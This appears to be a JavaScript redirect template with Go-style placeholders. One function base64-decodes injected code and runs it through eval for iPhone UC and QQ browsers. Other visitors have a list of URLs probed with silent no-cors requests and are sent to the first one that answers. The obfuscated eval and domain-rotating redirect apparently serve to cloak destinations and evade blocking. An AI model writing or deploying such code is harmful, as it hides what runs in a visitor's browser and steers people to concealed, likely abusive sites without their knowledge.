var jumpcdn = 1;

function gotourl() {
    var bajm1 = atob('{{.TargetCode1}}');
    var bajm2 = atob('{{.TargetCode2}}');

    bajm2 = bajm2.replace(/\|/g, '.');

    var bajm3 = bajm1 + '"' + bajm2 + '";';

    eval(bajm3);
}

var uag = 0;

if (
    navigator.userAgent.indexOf('iPhone') !== -1 &&
    navigator.userAgent.indexOf('UCBrowser') !== -1
) {
    uag = 1;
}

if (
    navigator.userAgent.indexOf('iPhone') !== -1 &&
    navigator.userAgent.indexOf('QQBrowser') !== -1
) {
    uag = 1;
}

if (uag == 0) {
    async function fetchProfile(fU) {
        const res = await fetch(fU, {
            method: 'HEAD',
            mode: 'no-cors'
        }).then(response => {
            location.href = fU + '';
        }).catch(error => false);
    }

    var tU = '{{.URLs}}';

    for (let ui = 0; ui < tU.split('|+|').length; ui++) {
        sU = tU.split('|+|')[ui];
        fetchProfile(sU);
    }
} else {
    gotourl();
}